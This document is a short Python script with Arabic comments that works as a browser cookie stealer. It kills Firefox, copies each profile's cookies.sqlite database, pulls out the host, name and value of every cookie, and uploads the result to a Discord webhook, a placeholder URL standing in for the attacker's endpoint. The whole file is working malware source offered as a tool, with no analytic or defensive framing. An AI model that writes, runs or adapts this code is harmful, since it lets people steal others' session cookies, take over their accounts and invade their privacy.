import os
import sqlite3
import shutil
import random
import subprocess
import requests

# وضع رابط الـ Webhook الخاص بـ Discord
webhook_url = "WEBHOOKS_URL"

desktop_path = os.path.expanduser("~/temp")

# A helper function to write data to a file
def writeforfile(data, filename):
    try:
        with open(os.path.join(desktop_path, filename), 'w', encoding='utf-8') as f:
            for line in data:
                f.write(line + "\n")
    except Exception as e:
        print(f"Error writing file: {e}")

# Extract cookies from Firefox
def FirefoxCookie():
    try:
        firefoxpath = f"{os.getenv('APPDATA')}/Mozilla/Firefox/Profiles"
        if not os.path.exists(firefoxpath): return
        subprocess.Popen(f"taskkill /im firefox.exe /t /f >nul 2>&1", shell=True)
        
        for subdir, dirs, files in os.walk(firefoxpath):
            for file in files:
                if file.endswith("cookies.sqlite"):
                    tempfold = os.path.join(desktop_path, "temp" + ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(8)) + ".db")
                    shutil.copy2(os.path.join(subdir, file), tempfold)
                    conn = sqlite3.connect(tempfold)
                    cursor = conn.cursor()
                    cursor.execute("SELECT host, name, value FROM moz_cookies")
                    data = cursor.fetchall()
                    cursor.close()
                    conn.close()
                    os.remove(tempfold)
                    
                    cookies = []
                    for row in data:
                        if row[0]:
                            cookies.append(f"{row[0]}\tTRUE\t/\tFALSE\t2597573456\t{row[1]}\t{row[2]}")
                    
                    writeforfile(cookies, "firefoxcookies.txt")

                    # إرسال الملف إلى Webhook Discord
                    file_path = os.path.join(desktop_path, "firefoxcookies.txt")
                    with open(file_path, 'rb') as file:
                        data = {
                            "content": "Here are the extracted Firefox cookies."
                        }
                        files = {
                            "file": file
                        }
                        response = requests.post(webhook_url, data=data, files=files)
                        if response.status_code != 204:
                            print(f"Error sending file: {response.text}")
                        else:
                            print("File successfully sent to Discord Webhook.")

    except Exception as e:
        print(f"Error extracting Firefox cookies: {e}")

# Start the Firefox cookie extraction
FirefoxCookie()
